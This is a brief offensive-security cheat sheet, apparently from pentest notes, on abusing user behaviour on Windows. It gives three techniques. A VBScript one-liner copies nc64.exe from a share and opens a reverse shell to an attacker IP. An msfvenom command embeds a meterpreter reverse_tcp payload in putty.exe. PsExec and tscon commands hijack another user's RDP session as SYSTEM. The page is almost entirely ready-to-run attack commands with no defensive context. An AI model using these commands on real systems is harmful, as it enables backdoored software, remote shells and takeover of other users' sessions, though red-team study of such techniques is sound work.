# Abusing User Behaviour

## Backdooring .vbs Scripts

Put it on a share

```vba
CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\10.10.28.6\myshare\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe <attacker_ip> 1234", 0, True

```

## Backdooring .exe Files

\
Exemple backdooring a putty.exe file&#x20;

```bash
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 -b "\x00" -f exe -o puttyX.exe

```

## RDP hijacking

```batch
# As admin run cmd as system
PsExec64.exe -s cmd.exe
# fetch users 
query user
# switch session
tscon <target session id> /dest:<current_sesion_name>

```
